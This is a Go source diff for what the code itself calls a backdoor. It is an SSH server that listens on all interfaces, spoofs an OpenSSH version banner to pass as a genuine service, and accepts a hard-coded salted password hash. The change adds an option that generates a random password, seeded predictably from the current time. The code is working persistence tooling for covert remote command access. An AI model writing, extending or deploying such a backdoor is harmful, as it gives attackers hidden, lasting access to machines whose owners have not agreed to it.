@@ -6,8 +6,11 @@ import (
 	"io"
 	"io/ioutil"
 	"log"
+	"math/rand"
 	"net"
 	"os/exec"
+	"strings"
+	"time"
 
 	"github.com/creack/pty"
 	"github.com/gliderlabs/ssh"
@@ -16,14 +19,19 @@ import (
 	"golang.org/x/crypto/ssh/terminal"
 )
 
-var hash string = "bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3"
+var (
+	hash     string
+	password string
+)
 
 func main() {
 	var (
 		lport       uint   = 2222
 		lhost       net.IP = net.ParseIP("0.0.0.0")
 		keyPath     string = "id_rsa"
-		fingerprint string = "OpenSSH_8.2p1 Debian-4"
+		fingerprint string = "SSH-2.0-OpenSSH_8.8"
+		passLength  int    = 16
+		randPass    int
 	)
 
 	flaggy.UInt(&lport, "p", "port", "Local port to listen for SSH on")
@@ -31,9 +39,20 @@ func main() {
 	flaggy.String(&keyPath, "k", "key", "Path to private key for SSH server")
 	flaggy.String(&fingerprint, "f", "fingerprint", "SSH Fingerprint, excluding the SSH-2.0- prefix")
 	flaggy.String(&hash, "a", "hash", "Hash for backdoor")
+	flaggy.Int(&randPass, "r", "rand-pass", "Generate a random password of a given length.")
 	flaggy.Parse()
 
 	log.SetPrefix("SSH - ")
+
+	if randPass > 0 {
+		passLength = randPass
+		password = generatePassword(passLength)
+		hash = hashPassword(password, "1c362db832f3f864c8c2fe05f2002a05")
+		log.Println("Generated password:", password)
+	} else {
+		hash = "bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3" // Default password
+	}
+
 	privKeyBytes, err := ioutil.ReadFile(keyPath)
 	if err != nil {
 		log.Panicln("Error reading privkey:\t", err.Error())
@@ -106,4 +125,19 @@ func runCommand(cmd string) []byte {
 
 func passwordHandler(_ ssh.Context, password string) bool {
 	return verifyPass(hash, "1c362db832f3f864c8c2fe05f2002a05", password)
+}
+
+func generatePassword(length int) string {
+	var (
+		charset  = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWYZ0123456789*-+=$_;().,")
+		password strings.Builder
+	)
+	rand.Seed(time.Now().Unix())
+
+	for i := 0; i < length; i++ {
+		random := rand.Intn(len(charset))
+		randomChar := charset[random]
+		password.WriteRune(randomChar)
+	}
+	return password.String()
 }
